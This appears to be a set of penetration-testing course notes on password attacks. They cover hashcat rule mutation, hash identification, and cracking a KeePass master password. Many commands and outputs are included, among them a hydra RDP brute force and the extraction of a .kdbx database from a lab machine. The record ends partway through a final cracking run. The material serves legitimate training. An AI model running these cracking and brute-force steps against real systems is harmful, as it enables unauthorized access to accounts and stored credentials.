+kali@kali:~/passwordattacks$ hashcat -r demo1.rule --stdout demo.txt
+Password1
+Iloveyou1
+Princess1
+Rockyou1
+Abc1231
+
+kali@kali:~/passwordattacks$ cat demo2.rule   
+$1
+c
+
+kali@kali:~/passwordattacks$ hashcat -r demo2.rule --stdout demo.txt
+password1
+Password
+iloveyou1
+Iloveyou
+princess1
+Princess
+...
+```
+- Now to add the special char.
+- We will start with `!`, a common special char.
+ - Therefore we will add `$1` to our rule file.
+```bash
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ echo \$1 c \$! > demo1.rule
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ cat demo1.rule             
+$1 c $!
+```
+- We will make two rule file variations.
+```bash
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ echo \$1 c \$! > demo1.rule
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ cat demo1.rule             
+$1 c $!
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ echo \$! \$1 c > demo2.rule
+
+
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ cat demo2.rule 
+$! $1 c
+
+
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ hashcat -r demo1.rule --stdout demo.txt
+Password1!
+Iloveyou1!
+Princess1!
+Rockyou1!
+Abc1231!
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ hashcat -r demo2.rule --stdout demo.txt
+Password!1
+Iloveyou!1
+Princess!1
+Rockyou!1
+Abc123!1
+```
+
+With this basic understanding, let's assume we have retrieved an MD%:
+```bash
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ echo -n "f621b6c9eab51a3e2f4e167fee4c6860" > crackme.txt
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ cat crackme.txt      
+f621b6c9eab51a3e2f4e167fee4c6860 
+```
+- We will use `rockyout.txt`
+- Modify for a policy including:
+ - Upper case letter.
+ - Numerical value.
+ - Special char.
+- Let's create out rule file, `demo3.rule`
+ - Use `c` function to cap first char and lower the rest.
+ - Append special char `$!`
+ - For num, the ever-popular `123`
+		- `$1 $2 $3`
+  - Which we will follow with our special char.
+```bash
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ echo \$1 \$2 \$3 c \$! > demo3.rule 
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ cat demo3.rule 
+$1 $2 $3 c $!
+```
+- We will run Hshcast without debugging.
+ - Set the hash type to MD5 with `-m 0`
+ - Then the target hash file `crackme.txt`
+ - And the `rockyou.txt` wordlist.
+ - Followed by `-r` and our rule file.
+ - Ending with `--force` to ingnore Hashcat warnings.
+```bash
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force
+hashcat (v6.2.6) starting
+
+...
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+f621b6c9eab51a3e2f4e167fee4c6860:Computer123!             
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 0 (MD5)
+Hash.Target......: f621b6c9eab51a3e2f4e167fee4c6860
+Time.Started.....: Sun Oct  1 08:44:29 2023, (0 secs)
+Time.Estimated...: Sun Oct  1 08:44:29 2023, (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Mod........: Rules (demo3.rule)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  4489.6 kH/s (0.54ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 8192/14344385 (0.06%)
+Rejected.........: 0/8192 (0.00%)
+Restore.Point....: 0/14344385 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: 123456123! -> Whitetiger123!
+Hardware.Mon.#1..: Temp: 39c Util: 12%
+
+Started: Sun Oct  1 08:44:14 2023
+Stopped: Sun Oct  1 08:44:30 2023
+```
+- In this case we recover `Computer123!`
+ - Not included in the default `rockyou.txt`
+ - It only took hashcat a few seconds on CPU.
+
+**When attempting to create rules** to mutate and existing wordlist:
+- Always consider human behavior and convenience regarding passwords.
+- Most users, use a main word and modify it to fit a policy.
+- Often appending numbers and special chars.
+- When an upper case is req, most user cap the first char.
+- When a special char is req, most users append it to the end.
+ - Often relying on chars on the left side of the keyboard as they are easy to reach and type.
+
+Instead of creating rules ourselves, we can also use rules provided by Hashcat and other sources.  Hashcat includes a variety of rules in `/usr/share/hashcat/rules`.
+```bash
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ ls /usr/share/hashcat/rules        
+best64.rule                  T0XlC_3_rule.rule
+combinator.rule              T0XlC-insert_00-99_1950-2050_toprules_0_F.rule
+d3ad0ne.rule                 T0XlC_insert_HTML_entities_0_Z.rule
+dive.rule                    T0XlC-insert_space_and_special_0_F.rule
+generated2.rule              T0XlC-insert_top_100_passwords_1_G.rule
+generated.rule               T0XlC.rule
+hybrid                       T0XlCv2.rule
+Incisive-leetspeak.rule      toggles1.rule
+InsidePro-HashManager.rule   toggles2.rule
+InsidePro-PasswordsPro.rule  toggles3.rule
+leetspeak.rule               toggles4.rule
+oscommerce.rule              toggles5.rule
+rockyou-30000.rule           unix-ninja-leetspeak.rule
+specific.rule
+```
+- The cover a wide range of mutations.
+ - Most useful when we don't know the target's password policy.
+ - We will use predefined rules in upcoming examples.
+- It's always most efficient to gain information about the target password policy or find typically used default policies for the target software env.
+
+###### Exercises
+
+You extracted the MD5 hash "056df33e47082c77148dba529212d50a" from a target system. Create a rule to add "1@3$5" to each password of the rockyou.txt wordlist and crack the hash.
+```bash
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ echo -n "056df33e47082c77148dba529212d50a" > ex1.txt    
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ cat ex1.txt    
+056df33e47082c77148dba529212d50a                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ echo -n \$1 \$@ \$3 \$\$ \$5 > ex1.rules            
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ cat ex1.rules 
+$1 $@ $3 $$ $5                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ hashcat -m 0 ex1.txt /usr/share/wordlists/rockyou.txt -r ex1.rules --force
+hashcat (v6.2.6) starting
+
+You have enabled --force to bypass dangerous warnings and errors!
+This can hide serious problems and should only be done when debugging.
+Do not report hashcat issues encountered when using --force.
+
+OpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+==================================================================================================================================================
+* Device #1: cpu-skylake-avx512-11th Gen Intel(R) Core(TM) i7-1185G7 @ 3.00GHz, 14844/29752 MB (4096 MB allocatable), 8MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Early-Skip
+* Not-Salted
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+* Raw-Hash
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 2 MB
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+056df33e47082c77148dba529212d50a:courtney1@3$5            
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 0 (MD5)
+Hash.Target......: 056df33e47082c77148dba529212d50a
+Time.Started.....: Sun Oct  1 08:57:20 2023, (0 secs)
+Time.Estimated...: Sun Oct  1 08:57:20 2023, (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Mod........: Rules (ex1.rules)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  5306.1 kH/s (0.54ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 8192/14344385 (0.06%)
+Rejected.........: 0/8192 (0.00%)
+Restore.Point....: 0/14344385 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: 1234561@3$5 -> whitetiger1@3$5
+Hardware.Mon.#1..: Temp: 35c Util: 15%
+
+Started: Sun Oct  1 08:57:19 2023
+Stopped: Sun Oct  1 08:57:22 2023
+```
+
+You extracted the MD5 hash "19adc0e8921336d08502c039dc297ff8" from a target system. Create a rule which makes all letters upper case and duplicates the passwords contained in rockyou.txt and crack the hash.
+```bash
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ echo -n "19adc0e8921336d08502c039dc297ff8" > ex2.txt                     
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ echo 'u d' > ex2.rules                                                  
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ cat ex2.rules                                                             
+u d
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ hashcat -m 0 ex2.txt /usr/share/wordlists/rockyou.txt -r ex2.rules --force
+hashcat (v6.2.6) starting
+
+You have enabled --force to bypass dangerous warnings and errors!
+This can hide serious problems and should only be done when debugging.
+Do not report hashcat issues encountered when using --force.
+
+OpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+==================================================================================================================================================
+* Device #1: cpu-skylake-avx512-11th Gen Intel(R) Core(TM) i7-1185G7 @ 3.00GHz, 14844/29752 MB (4096 MB allocatable), 8MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Early-Skip
+* Not-Salted
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+* Raw-Hash
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 2 MB
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+19adc0e8921336d08502c039dc297ff8:BUTTERFLY5BUTTERFLY5     
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 0 (MD5)
+Hash.Target......: 19adc0e8921336d08502c039dc297ff8
+Time.Started.....: Sun Oct  1 09:10:30 2023, (0 secs)
+Time.Estimated...: Sun Oct  1 09:10:30 2023, (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Mod........: Rules (ex2.rules)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  5844.8 kH/s (0.34ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 16384/14344385 (0.11%)
+Rejected.........: 0/16384 (0.00%)
+Restore.Point....: 8192/14344385 (0.06%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: TOTAL90TOTAL90 -> COCOLISOCOCOLISO
+Hardware.Mon.#1..: Temp: 37c Util: 13%
+
+Started: Sun Oct  1 09:10:29 2023
+Stopped: Sun Oct  1 09:10:32 2023
+```
+
+
+##### Cracking Methodology
+
+The process of cracking a has is described in the following steps:
+
+- Extract hashes.
+- Format hashes.
+- Calculate the cracking time.
+- Prepare wordlist.
+- Attack the hash.
+
+- **Extract hashes**.
+ - In a pentest you will find hashes in various locations.
+  - A DB dump for instance.
+- **Format hashes** into the tools expected cracking format.
+ - To do this we need to know the algo used to create the hash.
+ - We can ID the hash type with.
+		- [hash-identifier](https://www.kali.org/tools/hash-identifier/)
+		- [hashid](https://www.kali.org/tools/hashid/)
+  - Both installed on Kali by default.
+ - Depending on the hash algo and source of the hash.
+  - Check if it is already in the correct format for our cracking tool.
+  - If not, we must use helper tools to change the representation of the hash into the expected format.
+- **Calculate cracking time**.
+ - Determine the feasibility of our cracking attempt.
+ - As discussed.
+		- `keyspace / hashrate`
+ - If the cracking time exceeds our expected lifetime, we may have to reconsider our approach.
+ - Realistically, consider the duration of the current engagement and the resources we have to run our cracking attempts.
+  - Cloud based GPU for instance.
+- **Wordlist preparation**.
+ - In almost every case we should mutate our wordlist and perform a rule based attack.
+ - Investigate potential password policies and research other vectors.
+  - Including online password leaks.
+ - Without this, we may need to run multiple wordlists with/without pre-existing rules to broaden coverage of possible passwords.
+- **Attack the hash**.
+ - Take special care when copy-pasta our hashes.
+  - A space or a newline can derail our efforts.
+ - We must be sure of the hash type.
+  - For instance, hashid cannot differentiate between MD2, MD4, or MD5.
+   - An incorrect choice will waste time.
+   - Avoid this by double checking results with other tools.
+   - Do additional research to confirm.
+
+The best way to improve our results is to operate with focus and structure.
+
+###### Exercises
+
+Identify the hash function of the following hash "4a41e0fdfb57173f8156f58e49628968a8ba782d0cd251c6f3e2426cb36ced3b647bf83057dabeaffe1475d16e7f62b7"
+```bash
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ hashid 4a41e0fdfb57173f8156f58e49628968a8ba782d0cd251c6f3e2426cb36ced3b647bf83057dabeaffe1475d16e7f62b7
+Analyzing '4a41e0fdfb57173f8156f58e49628968a8ba782d0cd251c6f3e2426cb36ced3b647bf83057dabeaffe1475d16e7f62b7'
+[+] SHA-384 
+[+] SHA3-384 
+[+] Skein-512(384) 
+[+] Skein-1024(384) 
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ hash-identifier -h
+   #########################################################################
+   #     __  __                     __           ______    _____           #
+   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
+   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
+   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
+   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
+   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
+   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
+   #                                                             By Zion3R #
+   #                                                    www.Blackploit.com #
+   #                                                   Root@Blackploit.com #
+   #########################################################################
+--------------------------------------------------
+
+ Not Found.
+--------------------------------------------------
+ HASH: 4a41e0fdfb57173f8156f58e49628968a8ba782d0cd251c6f3e2426cb36ced3b647bf83057dabeaffe1475d16e7f62b7
+
+Possible Hashs:
+[+] SHA-384
+[+] SHA-384(HMAC)
+--------------------------------------------------
+```
+
+Identify the hash function of the following hash "$2y$10$XrrpX8RD6IFvBwtzPuTlcOqJ8kO2px2xsh17f60GZsBKLeszsQTBC"
+```
+# hashid identifies the algo
+
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ hashid '$2y$10$XrrpX8RD6IFvBwtzPuTlcOqJ8kO2px2xsh17f60GZsBKLeszsQTBC'
+Analyzing '$2y$10$XrrpX8RD6IFvBwtzPuTlcOqJ8kO2px2xsh17f60GZsBKLeszsQTBC'
+[+] Blowfish(OpenBSD) 
+[+] Woltlab Burning Board 4.x 
+[+] bcrypt 
+
+# Google and wiki page indicate Bcrypt as the function! https://en.wikipedia.org/wiki/Bcrypt
+
+# Note the alg/cost: $2y$10
+
+$2a$12$R9h/cIPz0gi.URNNX3kh2OPST9/PgBkqquzi.Ss7KIUgO2t0jWMUW
+\__/\/ \____________________/\_____________________________/
+Alg Cost      Salt                        Hash
+```
+
+
+##### Password Manager
+
+Password managers create and store passwords for different services and protect them with a master password.  The master password grants access to all creds held in the manager.  Users often copy-paste from the manager or use auto-fill browser function.
+- Popular managers:
+	- [1Password](https://1password.com/)
+	- [KeePass](https://keepass.info/)
+- Software of this type can assist users who must maintain many, complex, passwords.
+ - It can also introduce risk.
+
+We will demonstrate a common pentest scenario, where we have gained access to a client workstation running a passman.  We will:
+- Extract the passman DB.
+- Transform the file into Hashcat usable format.
+- Crack the master DB pass.
+
+Begin by connecting to SALESWK01 lab machine via RDP, assuming we have obtained the credentials, and gain access to the desktop.  Once connected:
+- Check installed programs.
+ - Since we have GUI, use "Apps & Features" Win function.
+  - Win icon.
+  - Apps.
+  - Add or remove.
+  - Then scroll the list to review installed programs.
+- We find `KeePass Password Safe 2.51.1` on system.
+ - If we are unfamiliar, we should research it.
+ - We discover the KeePass DB is stored as a `.kbdx` file.
+  - Search the system for this extension.
+```
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Users\jason> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+
+
+    Directory: C:\Users\jason\Documents
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         5/30/2022  10:33 AM           1982 Database.kdbx
+```
+- User PowerShell.
+	- [Get-ChildItem](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-childitem)
+ - Search the whole drive with `-Path C:\`
+ - Specify file type with `-Include`
+ - Get a list of files and sub dirs with `-File` and `-Recurse`
+	- Silence errors and cont exec with `-ErrorAction` set to `SilentlyContinue`
+
+We find the DB in the user's Documents folder.  Transfer the DB to our Kali system in preparation for the attack.  Thus completing the first step of our methodology.
+
+Next, tranform the has into a format our cracking tool can use.
+- JtR suite includes various transformation scripts.
+	- [ssh2john](https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py)
+	- [keepass2john](https://github.com/openwall/john/blob/bleeding-jumbo/src/keepass2john.c)
+ - These are installed by default in Kali.
+  - They can also format for Hashcat!
+
+We will use `keepass2john` to format the DB and save the output as `keepass.hash`.
+```bash
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ keepass2john Database.kdbx > keepass.hash
+
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ cat keepass.hash            
+Database:$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1
+```
+- Before we can work with it, we need to modify it further.
+- The JtR script prepended the filename `Database` to the hash.
+ - It does this to act as the username for the hash.
+  - Helpful when cracking DB hashes as we want the output to contain the username:password pairs.
+ - Since KeePass uess a master password without a username we must remove the `Database:` string.
+```bash
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ cat keepass.hash
+$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1
+```
+- The hash is now in the correct format for Hashcat!
+
+Now we must determine the correct hash type.
+- To determine this hashtype.
+ - We can look it up in the Hashcat wiki.
+ - Or grep Hashcat help.
+```bash
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ hashcat --help | grep -i "KeePass"
+  13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)                | Password Manager
+  29700 | KeePass 1 (AES/Twofish) and KeePass 2 (AES) - keyfile only mode | Password Manager
+```
+- The correct mode appears to be `13400`
+
+We will skip step 3, cracking time calculation, since this is a simple example.
+
+Next we prepare our wordlist.
+- We will use a Hashcat provided rule `rockyou-30000.rule`
+ - Combining this with the `rockyou.txt` wordlist.
+ - This rule is highly effect with the rockyou wordlist as it was tailored for it.
+
+We have prepared everything and are ready to begin out attack!  Run Hashcat with the requisite arguments.
+```bash
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
+hashcat (v6.2.6) starting
+
+...
+
+$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1:qwertyuiop123!
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 13400 (KeePass 1 (AES/Twofish) and KeePass 2 (AES))
+Hash.Target......: $keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d...7496c1
+Time.Started.....: Sun Oct  1 10:21:42 2023, (35 secs)
+Time.Estimated...: Sun Oct  1 10:22:17 2023, (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Mod........: Rules (/usr/share/hashcat/rules/rockyou-30000.rule)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:    92358 H/s (10.34ms) @ Accel:128 Loops:60 Thr:1 Vec:16
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 3213312/430331550000 (0.00%)
+Rejected.........: 0/3213312 (0.00%)
+Restore.Point....: 0/14344385 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:3137-3138 Iteration:0-60
+Candidate.Engine.: Device Generator
+Candidates.#1....: 123456123! -> bethany123!
+Hardware.Mon.#1..: Temp: 57c Util: 97%
+
+Started: Sun Oct  1 10:21:22 2023
+Stopped: Sun Oct  1 10:22:18 2023
+```
+- We have recovered `qwertyuiop123!`
+- Run KeePass on our target system and enter the master pass when prompted.
+ - We now have access to all of the user's saved passwords.
+
+###### Exercises
+
+Enumerate VM #2 and get access to the system as user nadine. Obtain the password stored as title "flag" in the password manager.
+```
+# Enumerate VM2
+
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ sudo nmap -sS -T 5 -p 1-65355 $VM2           
+[sudo] password for operator: 
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-01 10:52 PDT
+Stats: 0:01:17 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 20.84% done; ETC: 10:59 (0:04:53 remaining)
+Stats: 0:05:25 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 85.37% done; ETC: 10:59 (0:00:56 remaining)
+Warning: 192.168.235.227 giving up on port because retransmission cap hit (2).
+Nmap scan report for 192.168.235.227
+Host is up (0.075s latency).
+Not shown: 65328 closed tcp ports (reset)
+PORT      STATE    SERVICE
+135/tcp   open     msrpc
+139/tcp   open     netbios-ssn
+445/tcp   open     microsoft-ds
+3354/tcp  filtered suitjd
+3389/tcp  open     ms-wbt-server
+5040/tcp  open     unknown
+7494/tcp  filtered unknown
+7915/tcp  filtered unknown
+11491/tcp filtered unknown
+15710/tcp filtered unknown
+23652/tcp filtered unknown
+27901/tcp filtered unknown
+29854/tcp filtered unknown
+41936/tcp filtered unknown
+44089/tcp filtered unknown
+49664/tcp open     unknown
+49665/tcp open     unknown
+49666/tcp open     unknown
+49667/tcp open     unknown
+49668/tcp open     unknown
+49669/tcp open     unknown
+49670/tcp open     unknown
+49671/tcp open     unknown
+53149/tcp filtered unknown
+55876/tcp filtered unknown
+56730/tcp filtered unknown
+57794/tcp filtered unknown
+
+# We have open RDP and a username, but no password... attempt brute force.
+
+
+```bash
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ hydra -l nadine -P /usr/share/wordlists/rockyou.txt rdp://$VM2
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-01 11:04:40
+[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
+[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
+[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
+[DATA] attacking rdp://192.168.235.227:3389/
+[STATUS] 160.00 tries/min, 160 tries in 00:01h, 14344239 to do in 1494:12h, 4 active
+[3389][rdp] host: 192.168.235.227   login: nadine   password: 123abc
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-10-01 11:05:59
+
+
+### Recovered password 123abc, RDP in...
+### Search apps installed, found KeePass Password Safe 2.51.1
+### Search for DB
+
+
+PS C:\Users\nadine> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+
+
+    Directory: C:\Users\nadine\Documents
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----          6/9/2022  10:39 AM           1966 Database.kdbx
+
+
+### Retrieve from user's Documents to attacking machine
+### Prepare for cracking with JtR tools
+
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$  keepass2john Database.kdbx > vm2.hash
+                                                                                                      
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ cat vm2.hash    
+Database:$keepass$*2*1*0*b1a85c5029830d00eead372eff9b2c0c5f2b78d8adf6090568429ba7b9622f25*27ab0d96aaacbb427dc6e9746fcf5148a468d042855186d3d1409d40ca018fa1*2eb108ae671a4aebcfa4217b5dcdccdc*ea47adcf48185eb7d670b25a3b2f8a535eb72339bbdf2e0d05c892bad22287f0*e250173255fbe9861707502ebef385c839fd328dac2f7874ff3b0bfc13cf4b56
+                                                                                                      
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ nano vm2.hash    
+                                                                                                      
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ cat vm2.hash 
+$keepass$*2*1*0*b1a85c5029830d00eead372eff9b2c0c5f2b78d8adf6090568429ba7b9622f25*27ab0d96aaacbb427dc6e9746fcf5148a468d042855186d3d1409d40ca018fa1*2eb108ae671a4aebcfa4217b5dcdccdc*ea47adcf48185eb7d670b25a3b2f8a535eb72339bbdf2e0d05c892bad22287f0*e250173255fbe9861707502ebef385c839fd328dac2f7874ff3b0bfc13cf4b56
+
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ hashcat --help | grep -i "KeePass"
+  13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)                | Password Manager
+  29700 | KeePass 1 (AES/Twofish) and KeePass 2 (AES) - keyfile only mode | Password Manager
+                                                                                                      
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ hashcat -m 13400 vm2.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
+hashcat (v6.2.6) starting
+
+You have enabled --force to bypass dangerous warnings and errors!
+This can hide serious problems and should only be done when debugging.
+Do not report hashcat issues encountered when using --force.
+
+OpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+==================================================================================================================================================
+* Device #1: cpu-skylake-avx512-11th Gen Intel(R) Core(TM) i7-1185G7 @ 3.00GHz, 14844/29752 MB (4096 MB allocatable), 8MCU.
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 30000
+
+Optimizers applied:
+* Zero-Byte.
+* Single-Hash.
+* Single-Salt.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 2 MB
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt.
+* Passwords.: 14344385.
